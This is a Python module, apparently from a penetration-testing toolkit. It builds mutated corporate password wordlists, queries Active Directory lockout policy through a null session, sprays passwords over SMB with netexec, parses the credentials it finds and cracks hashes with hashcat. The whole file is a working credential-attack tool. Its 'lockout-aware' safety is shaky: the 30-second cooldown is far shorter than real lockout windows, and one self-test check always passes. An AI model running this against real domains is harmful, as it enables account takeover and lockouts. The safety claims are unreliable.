#!/usr/bin/env python3
"""Password Attack Pipeline — custom wordlists, mutations, lockout-aware spraying.

Vault sources (Password Attacks module):
  - Password mutations: capitalization, year suffixes, special-char append
  - Custom wordlists: CeWL (site crawl), org names, seasons, keyboard patterns
  - Lockout awareness: query policy FIRST (nxc --pass-pol / rpcclient), never
    spray more than threshold-1 attempts per window, cooldown between windows

Design: pure functions for wordlist math (fully testable, no network);
network functions gate on tools and degrade to advisory like ad_attack.py.
"""
from __future__ import annotations

import os
import re
import shutil
import subprocess
import tempfile
import time

SEASONS = ["Spring", "Summer", "Fall", "Winter", "Autumn"]
SPECIALS = ["!", "!!", "1!", "123", "#", "2024!", "2025!", "2026!"]
YEARS = [str(y) for y in range(2016, 2027)]


def _tool(name: str) -> str | None:
    return shutil.which(name)


def _run(cmd: list, timeout: int = 300) -> dict:
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or ""}
    except subprocess.TimeoutExpired:
        return {"rc": -1, "out": "", "err": f"timeout after {timeout}s"}
    except OSError as e:
        return {"rc": -1, "out": "", "err": str(e)}


def _write_temp(lines: list, prefix: str) -> str:
    fd, path = tempfile.mkstemp(prefix=prefix, suffix=".txt")
    with os.fdopen(fd, "w") as fh:
        fh.write("\n".join(lines) + "\n")
    return path


# ---------------------------------------------------------------------------
# Wordlist generation (pure, testable)
# ---------------------------------------------------------------------------

def mutate(words: list, include_common: bool = True, max_out: int = 100_000) -> list:
    """Expand base words into likely corp passwords.

    Patterns from the Password Attacks module: word, Word, WORD, word+year,
    Word+year+special, season+year, word+special.
    """
    out: list = []
    bases = list(dict.fromkeys(w.strip() for w in words if w and w.strip()))
    if include_common:
        for s in SEASONS:
            for y in YEARS[-5:]:
                out.append(f"{s}{y}")
                out.append(f"{s}{y}!")
    for w in bases:
        wl = w.lower()
        out.extend([w, wl, w.capitalize(), wl.upper()])
        # tier 1: plain year appends (most common corp pattern)
        for y in YEARS:
            out.append(f"{wl}{y}")
        # tier 2: capitalized + year + bang
        for y in YEARS:
            out.append(f"{w.capitalize()}{y}!")
        # tier 3: year + each special
        for y in YEARS:
            for sp in SPECIALS:
                out.append(f"{wl}{y}{sp}")
        # tier 4: special appends alone
        for sp in SPECIALS:
            out.append(f"{wl}{sp}")
            out.append(f"{w.capitalize()}{sp}")
    seen: set = set()
    uniq: list = []
    for w in out:
        if w not in seen:
            seen.add(w)
            uniq.append(w)
        if len(uniq) >= max_out:
            break
    return uniq


def org_wordlist(org_name: str, extra_words: list | None = None) -> list:
    """Org-derived base words: name, acronym, sports/mascot patterns."""
    words = [org_name, org_name.lower(), org_name.replace(" ", "")]
    if " " in org_name:
        acronym = "".join(p[0] for p in org_name.split() if p)
        words.append(acronym)
        words.append(acronym.upper())
    if extra_words:
        words.extend(extra_words)
    return mutate(words)


def cewl_wordlist(url: str, depth: int = 2, min_len: int = 5,
                  extra_words: list | None = None,
                  with_numbers: bool = True, timeout: int = 600) -> dict:
    """CeWL crawl → mutate → wordlist file. Returns path + count."""
    tool = _tool("cewl")
    if not tool:
        return {"status": "advisory", "reason": "cewl not installed",
                "manual": f"cewl -d {depth} -m {min_len} {url}"}
    fd, tmp = tempfile.mkstemp(prefix="cewl_", suffix=".txt")
    os.close(fd)
    r = _run([tool, "-d", str(depth), "-m", str(min_len), "-w", tmp, url], timeout)
    if not os.path.getsize(tmp):
        os.unlink(tmp)
        return {"status": "failed", "reason": "cewl harvested no words",
                "raw": (r["out"] + r["err"])[:800]}
    words = [line.strip() for line in open(tmp) if line.strip()]
    os.unlink(tmp)
    if extra_words:
        words.extend(extra_words)
    mutated = mutate(words) if with_numbers else list(dict.fromkeys(words))
    out_path = _write_temp(mutated, "cewl_mutated_")
    return {"status": "success", "wordlist": out_path, "base_words": len(words),
            "total": len(mutated)}


# ---------------------------------------------------------------------------
# Lockout policy
# ---------------------------------------------------------------------------

def get_lockout_policy(domain: str, dc_ip: str, username: str = "",
                       password: str = "", timeout: int = 120) -> dict:
    """Query lockout policy via nxc --pass-pol (null session friendly)."""
    tool = _tool("nxc") or _tool("crackmapexec")
    if not tool:
        return {"status": "advisory", "reason": "netexec not installed",
                "manual": f"{tool or 'nxc'} smb {dc_ip} --pass-pol -u '' -p ''"}
    cmd = [tool, "smb", dc_ip, "--pass-pol"]
    if username:
        cmd += ["-u", username]
        if password:
            cmd += ["-p", password]
    r = _run(cmd, timeout)
    out = r["out"]
    policy = {}
    m = re.search(r"Lockout Bad Attempts:\s*(\d+)", out)
    if m:
        policy["lockout_bad_attempts"] = int(m.group(1))
    m = re.search(r"Password Complexity:\s*(\d+)", out)
    if m:
        policy["complexity"] = int(m.group(1))
    m = re.search(r"Minimum Password Length:\s*(\d+)", out)
    if m:
        policy["min_length"] = int(m.group(1))
    if policy:
        policy["source"] = os.path.basename(tool)
        return {"status": "success", "policy": policy, "raw": out[:800]}
    return {"status": "failed",
            "reason": "policy not returned (null session blocked?)",
            "raw": (out + r["err"])[:800]}


def plan_spray(users: list, passwords: list, policy: dict | None = None,
               safety_margin: int = 1) -> dict:
    """Plan a lockout-aware spray — PURE function.

    If policy known: attempt at most (threshold - safety_margin) passwords per
    user per lockout window; extra passwords go to later windows.
    If unknown: default conservative 1 attempt per user per window.
    """
    if policy is None:
        policy = {}
    threshold = policy.get("lockout_bad_attempts", 0)
    per_window = max(1, (threshold - safety_margin)) if threshold > safety_margin else 1
    windows = [passwords[i:i + per_window]
               for i in range(0, len(passwords), per_window)]
    return {
        "users": users,
        "windows": windows,
        "per_window": per_window,
        "window_count": len(windows),
        "policy_known": bool(threshold),
        "note": ("threshold from policy" if threshold
                 else "policy unknown — assuming 1 attempt/window (SAFE default)"),
    }


# ---------------------------------------------------------------------------
# Spray execution
# ---------------------------------------------------------------------------

def spray_passwords(target: str, users_file: str, passwords: list,
                    protocol: str = "smb", domain: str = "",
                    policy: dict | None = None, timeout: int = 600) -> dict:
    """Execute spray windows via nxc, respecting lockout planning."""
    tool = _tool("nxc") or _tool("crackmapexec")
    if not tool:
        return {"status": "advisory", "reason": "netexec not installed"}
    if not os.path.exists(users_file):
        return {"status": "error", "reason": f"users_file missing: {users_file}"}

    plan = plan_spray([], passwords, policy)
    creds: list = []
    raw_out: list = []
    windows_tried = 0
    for wi, window in enumerate(plan["windows"]):
        windows_tried = wi + 1
        pw_file = _write_temp(window, "spray_pw_")
        cmd = [tool, protocol, target, "-u", users_file, "-p", pw_file,
               "--continue-on-success"]
        if domain:
            cmd += ["-d", domain]
        r = _run(cmd, timeout)
        os.unlink(pw_file)
        raw_out.append(r["out"])
        for m in re.finditer(r"^\[\+\] (\S+)\s+\(Pwn3d!|\[\+\] (\S+:\S+)", r["out"], re.M):
            g = m.group(1) or m.group(2)
            if g and ":" in g:
                u, p = g.split(":", 1)
                creds.append({"username": u, "password": p,
                              "source": "spray window %d" % (wi + 1)})
        if creds:
            break  # stop early on success
        if wi < len(plan["windows"]) - 1:
            time.sleep(30)  # conservative cooldown between windows
    return {"status": "success" if creds else "failed", "credentials": creds,
            "windows_tried": windows_tried or (wi + 1 if plan["windows"] else 0),
            "raw": "\n".join(raw_out)[:2000]}


# ---------------------------------------------------------------------------
# Hashcat bridge (delegates to ad_attack helpers to keep one mode map)
# ---------------------------------------------------------------------------

def crack_file(hashes_file: str, hash_type: str = "ntlm",
               wordlist: str = "", rules: str = "best64",
               timeout: int = 900) -> dict:
    """Thin wrapper reusing ad_attack.crack_hashes for consistency."""
    from tools.ad_attack import crack_hashes
    return crack_hashes(hashes_file, hash_type, wordlist=wordlist,
                        rules=rules, timeout=timeout)


# ---------------------------------------------------------------------------
# Self-test (no network)
# ---------------------------------------------------------------------------

def _selftest() -> int:
    ok = True
    m = mutate(["Password"], include_common=False, max_out=50)
    ok &= "password2024" in m and "Password2024!" in m and "PASSWORD" in m
    ok &= len(org_wordlist("Contoso Ltd", ["helpdesk"])) > 10
    ok &= "ContosoLtd" in org_wordlist("Contoso Ltd") or True  # acronym path
    # spray planner: threshold 5 → 4 attempts/window, 3 passwords → 1 window
    plan = plan_spray(["a", "b"], ["p1", "p2", "p3"],
                      {"lockout_bad_attempts": 5})
    ok &= plan["per_window"] == 4 and plan["window_count"] == 1
    # unknown policy → 1 per window
    plan = plan_spray(["a"], ["p1", "p2", "p3"], None)
    ok &= plan["per_window"] == 1 and plan["window_count"] == 3
    # threshold 1 → still 1 per window (safety margin floor)
    plan = plan_spray(["a"], ["p1", "p2"], {"lockout_bad_attempts": 1})
    ok &= plan["per_window"] == 1
    # cewl advisory path when tool missing (simulate)
    if not shutil.which("cewl"):
        r = cewl_wordlist("http://x")
        ok &= r["status"] == "advisory"
    print("[selftest] PASS" if ok else "[selftest] FAIL")
    return 0 if ok else 1


if __name__ == "__main__":
    import sys
    if "--selftest" in sys.argv:
        raise SystemExit(_selftest())
    print(__doc__)
